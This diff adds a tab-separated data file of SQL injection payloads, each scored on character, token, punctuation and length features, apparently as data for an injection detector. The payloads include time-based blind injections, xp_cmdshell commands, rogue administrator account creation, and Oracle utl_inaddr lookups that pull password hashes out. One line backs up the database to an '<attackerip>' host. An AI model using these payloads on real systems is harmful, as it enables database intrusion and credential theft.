@@ -1,0 +1,218 @@
+attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
+" or sleep(__time__)#	L	L	L	L	L	L	L	M	
+' or sleep(__time__)#	L	L	L	L	L	L	L	M	
+" or sleep(__time__)="	M	L	L	L	L	L	L	M	
+' or sleep(__time__)='	M	L	L	L	L	L	L	M	
+") or sleep(__time__)="	M	L	L	L	M	L	L	M	
+') or sleep(__time__)='	M	L	L	L	M	L	L	M	
+")) or sleep(__time__)="	M	L	L	L	M	L	L	M	
+')) or sleep(__time__)='	M	L	L	L	M	L	L	M	
+;waitfor delay '0:0:__time__'--	L	M	L	L	M	M	L	M	
+);waitfor delay '0:0:__time__'--	L	M	L	L	M	M	L	M	
+';waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+";waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+');waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+");waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+));waitfor delay '0:0:__time__'--	L	M	L	L	M	M	L	M	
+'));waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+"));waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+1 or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+" or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+' or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+1) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+") or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+') or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+1)) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+")) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+')) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+)%20or%20('x'='x	M	L	L	L	M	M	L	L	
+; execute immediate 'sel' || 'ect us' || 'er'	H	L	L	L	M	L	M	M	
+";waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))	L	M	L	L	M	M	L	M	
+"hi"") or (""a""=""a"	L	L	L	L	L	L	L	M	
+" or sleep(__time__)#	L	L	L	L	L	L	L	M	
+) or ('a'='a	M	L	L	L	M	L	L	L	
+@var select @var as var into temp end --	L	M	L	L	M	M	M	M	
+1)) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+"a"" or 3=3--"	M	L	L	L	L	M	L	L	
+" or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+1 waitfor delay '0:0:10'--	L	M	L	L	M	M	M	M	
+ or 'a'='a	M	L	L	L	L	L	L	L	
+or a = a	L	L	L	L	L	L	M	L	
+) or sleep(__time__)='	L	L	L	L	M	L	L	M	
+)) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+hi' or 'a'='a	M	L	L	L	L	L	L	L	
+")) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+hi') or ('a'='a	M	L	L	L	M	L	L	L	
+));waitfor delay '0:0:__time__'--	L	M	L	L	M	M	L	M	
+a' waitfor delay '0:0:10'--	M	M	L	L	M	M	M	M	
+ or '7659'='7659	M	L	L	L	L	M	L	L	
+ or 'text' = n'text'	M	L	L	L	L	L	M	L	
+ or 1=1 or ''='	M	M	L	L	L	M	M	L	
+declare @s varchar (200) select @s = 0x73656c6 ...	L	M	L	L	M	M	M	M	
+; exec master..xp_cmdshell 'ping 172.10.1.255'--	L	M	L	L	M	M	M	M	
+ or 'unusual' = 'unusual'	M	L	L	L	L	L	M	M	
+1) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+declare @s varchar(200) select @s = 0x77616974 ...	L	M	L	L	M	M	M	M	
+"));waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+or a=a	L	L	L	L	L	L	L	L	
+" or "a"="a	M	L	L	L	L	L	L	L	
+ and 1=( if((load_file(char(110,46,101,120,11 ...	L	M	L	L	M	L	M	M	
+t'exec master..xp_cmdshell 'nslookup www.googl ...	L	M	L	L	M	L	M	M	
+1 or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+%20or%20''='	M	L	L	L	L	M	L	L	
+hi' or 'x'='x';	M	L	L	L	L	L	L	L	
+") or sleep(__time__)="	M	L	L	L	M	L	L	M	
+ or 'whatever' in ('whatever')	M	L	L	L	M	L	M	M	
+; begin declare @var varchar(8000) set @var=' ...	L	M	L	L	M	M	M	M	
+ union select 1,load_file('/etc/passwd'),1,1,1;	L	M	L	L	M	L	M	M	
+a' or 1=1--	L	L	L	L	L	M	L	L	
+a' or 'a' = 'a	M	L	L	L	L	L	M	L	
+declare @s varchar(22) select @s =	L	M	L	L	M	M	M	M	
+ or a=a--	L	L	L	L	L	L	L	L	
+ or '1'='1	M	L	L	L	L	M	L	L	
+ or sleep(__time__)='	L	L	L	L	L	L	L	M	
+or 0=0 #"	M	L	L	L	L	M	L	L	
+declare @s varchar (8000) select @s = 0x73656c ...	L	M	L	L	M	M	M	M	
+) or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+;waitfor delay '0:0:__time__'--	L	M	L	L	M	M	L	M	
+ or 'text' > 't'	M	L	L	L	L	L	M	L	
+ or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+");waitfor delay '0:0:__time__'--	M	M	L	L	M	M	L	M	
+a' or 3=3--	L	L	L	L	L	M	L	L	
+ or ''='	M	L	L	L	L	L	L	L	
+")) or sleep(__time__)="	M	L	L	L	M	L	L	M	
+%20or%20'x'='x	M	L	L	L	L	M	L	L	
+ or 'something' = 'some'+'thing'	M	L	L	L	M	L	M	M	
+) or (a=a	L	L	L	L	L	L	L	L	
+x' and 1=(select count(*) from tabname); --	L	M	L	L	M	M	M	M	
+; or '1'='1'	M	L	L	L	L	M	L	L	
+declare @q nvarchar (200) select @q = 0x770061 ...	L	M	L	L	M	M	M	M	
+; exec ('sel' + 'ect us' + 'er')	M	L	L	L	M	L	M	M	
+anything' or 'x'='x	M	L	L	L	L	L	L	L	
+declare @q nvarchar (4000) select @q =	L	M	L	L	M	M	M	M	
+ select name from syscolumns where id = (sele ...	L	L	L	L	M	M	M	M	
+hi or a=a	L	L	L	L	L	L	L	L	
+);waitfor delay '0:0:__time__'--	L	M	L	L	M	M	L	M	
+") or benchmark(10000000,md5(1))#	L	M	L	L	M	M	L	M	
+)) or sleep(__time__)='	L	L	L	L	M	L	L	M	
+or 1=1 or ""=	M	M	L	L	L	M	M	L	
+ union select * from users where login = char ...	L	M	L	L	M	M	M	M	
+x' or 1=1 or 'x'='y	M	M	L	L	L	M	M	L	
+ or '1'='1'--	M	L	L	L	M	M	L	L	
+"a"" or 1=1--"	M	L	L	L	L	M	L	L	
+ or a = a	L	L	L	L	L	L	M	L	
+declare @q nvarchar (200) select @q = 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec(@q)	L	M	L	L	M	M	M	H	
+declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s) 	L	M	L	L	M	M	M	M	
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)	L	M	L	L	M	M	M	M	
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)	L	M	L	L	M	M	M	M	
+x' or full_name like '%bob%	M	L	L	L	L	L	M	M	
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--	M	M	L	L	M	M	M	M	
+'%20or%20''='	M	L	L	L	L	M	L	L	
+'%20or%20'x'='x	M	L	L	L	L	M	L	L	
+')%20or%20('x'='x	M	L	L	L	M	M	L	L	
+' or 0=0 #	M	L	L	L	L	M	M	L	
+ or 0=0 #"	M	L	L	L	L	M	M	L	
+' or '1'='1'--	M	L	L	L	M	M	L	L	
+' or 1=1 or ''='	M	M	L	L	L	M	M	L	
+ or 1=1 or ""=	M	M	L	L	L	M	M	L	
+' or a=a--	L	L	L	L	L	L	L	L	
+ or a=a	L	L	L	L	L	L	L	L	
+') or ('a'='a	M	L	L	L	M	L	L	L	
+'hi' or 'x'='x';	M	L	L	L	L	L	L	L	
+' or username like '%	M	L	L	L	L	L	M	M	
+' or uname like '%	M	L	L	L	L	L	M	L	
+' or userid like '%	M	L	L	L	L	L	M	L	
+' or uid like '%	M	L	L	L	L	L	M	L	
+' or user like '%	M	L	L	L	L	L	M	L	
+t'exec master..xp_cmdshell 'nslookup www.google.com'--	M	M	L	L	M	L	M	M	
+<>"'%;)(&+	M	L	L	L	M	L	L	L	
+' or ''='	M	L	L	L	L	L	L	L	
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--	M	M	L	L	M	M	M	M	
+'create user name identified by 'pass123' --	M	L	L	L	M	M	M	M	
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 	L	M	L	L	L	M	M	M	
+'exec sp_addlogin 'name' , 'password' --	M	L	L	L	M	L	M	M	
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --	M	L	L	L	M	L	M	M	
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --	M	M	L	L	M	M	M	M	
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)	L	H	L	L	H	H	H	H	
+' union (select null, (select @@version)) --	L	M	L	L	M	L	M	M	
+' union (select null, null, (select @@version)) --	L	M	L	L	M	L	M	M	
+' union (select null, null, null,  (select @@version)) --	L	M	L	L	M	L	M	M	
+' union (select null, null, null, null,  (select @@version)) --	L	M	L	L	M	L	M	M	
+' union (select null, null, null, null,  null, (select @@version)) --	L	H	L	L	M	L	M	M	
+exec master..xp_cmdshell 'ipconfig+/all'	L	M	L	L	M	L	L	M	
+exec master..xp_cmdshell 'net+view'	L	M	L	L	M	L	L	M	
+exec master..xp_cmdshell 'net+users'	L	M	L	L	M	L	L	M	
+exec master..xp_cmdshell 'ping+<attackerip>'	M	M	L	L	M	L	L	M	
+backup database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'	M	L	L	L	M	L	M	M	
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspв'" select * from myfile"--	M	M	L	L	M	M	M	M	
+1' and 1=(select count(*) from tablenames); --	L	M	L	L	M	M	M	M	
+1' or '1'='1	M	L	L	L	L	M	L	L	
+create table myfile (input text); load data infile '<filepath>' into table myfile; select * from myfile;	M	M	M	L	M	M	M	M	
+'or '' = '	M	L	L	L	L	L	M	L	
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--	H	M	L	L	M	M	M	M	
+' or '1'='1	M	L	L	L	L	M	L	L	
+'||utl_http.request('http://192.168.1.1/')||'	M	L	L	L	M	M	L	M	
+' || myappadmin.adduser('admin', 'newpass') || '	H	L	L	L	M	L	M	M	
+' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i	H	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select sys.login_user from dual)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select sys.database_name from dual)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select host_name from v$instance)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i	M	M	L	L	M	M	M	M	
+' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i	M	M	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=1)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=1)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=1)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=1)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=1)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=2)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=2)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=2)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	H	H	L	L	M	H	H	H	
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	H	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	M	H	L	L	M	M	M	H	
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	H	H	L	L	M	H	H	H	
+select current_setting('log_connections');	L	M	L	L	M	L	L	M	
+select current_setting('log_statement');	L	M	L	L	M	L	L	M	
+select current_setting('port');	L	M	L	L	M	L	L	M	
+select current_setting('password_encryption');	L	M	L	L	M	L	L	M	
+select current_setting('krb_server_keyfile');	L	M	L	L	M	L	L	M	
+select current_setting('virtual_host');	L	M	L	L	M	L	L	M	
+select current_setting('port');	L	M	L	L	M	L	L	M	
+select current_setting('config_file');	L	M	L	L	M	L	L	M	
+select current_setting('hba_file');	L	M	L	L	M	L	L	M	
+select current_setting('data_directory');	L	M	L	L	M	L	L	M	
+sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	L	M	L	M	M	M	M	M	
+sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	M	M	L	M	M	M	M	M	
